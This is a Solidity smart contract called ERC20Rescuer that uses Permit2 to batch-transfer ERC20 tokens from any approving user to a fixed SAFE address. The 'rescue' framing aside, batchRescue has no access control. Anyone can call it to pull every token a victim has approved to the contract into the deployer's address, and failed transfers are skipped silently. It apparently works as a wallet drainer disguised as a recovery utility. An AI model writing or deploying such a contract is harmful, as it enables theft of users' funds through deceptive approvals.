// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ──────────────────────────────────────────────────────────────────────────────
// INTERFACES
// ──────────────────────────────────────────────────────────────────────────────

interface IPermit2 {
    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;
}

// ──────────────────────────────────────────────────────────────────────────────
// CONTRACT
// ──────────────────────────────────────────────────────────────────────────────

contract ERC20Rescuer {
    // ────────────────────────────────────────────────────────────── Storage ────

    address public immutable SAFE;
    IPermit2 public immutable PERMIT2;

    // ────────────────────────────────────────────────────────────── Events ────

    event Rescued(address indexed token, address indexed from, uint256 amount);
    event RescueFailed(address indexed token, address indexed from, bytes reason);

    // ────────────────────────────────────────────────────────────── Constructor ────

    constructor(address _safe) {
        require(_safe != address(0), "Invalid safe address");
        SAFE = _safe;
        PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3); // Permit2 mainnet address
    }

    // ────────────────────────────────────────────────────────────── External Functions ────

    /**
     * @notice Batch rescue ERC20 tokens from any user to SAFE using Permit2
     * @param owner The user who approved tokens to this contract (or Permit2)
     * @param tokens Array of ERC20 token addresses
     * @param amounts Array of amounts to rescue (must match tokens length)
     */
    function batchRescue(
        address owner,
        address[] calldata tokens,
        uint256[] calldata amounts
    ) external {
        require(tokens.length == amounts.length, "Array length mismatch");

        uint256 len = tokens.length;
        unchecked {
            for (uint256 i = 0; i < len; ++i) {
                address token = tokens[i];
                uint256 amount = amounts[i];

                // Skip zero amounts
                if (amount == 0) continue;

                // Attempt transfer via Permit2
                try PERMIT2.transferFrom(owner, SAFE, uint160(amount), token) {
                    emit Rescued(token, owner, amount);
                } catch (bytes memory reason) {
                    emit RescueFailed(token, owner, reason);
                    // Continue to next token — do not revert whole batch
                }
            }
        }
    }

    // ────────────────────────────────────────────────────────────── View Helpers ────

    /**
     * @notice Returns the fixed safe address that receives rescued tokens
     */
    function safe() external view returns (address) {
        return SAFE;
    }

    /**
     * @notice Returns the Permit2 contract address being used
     */
    function permit2() external view returns (address) {
        return address(PERMIT2);
    }
}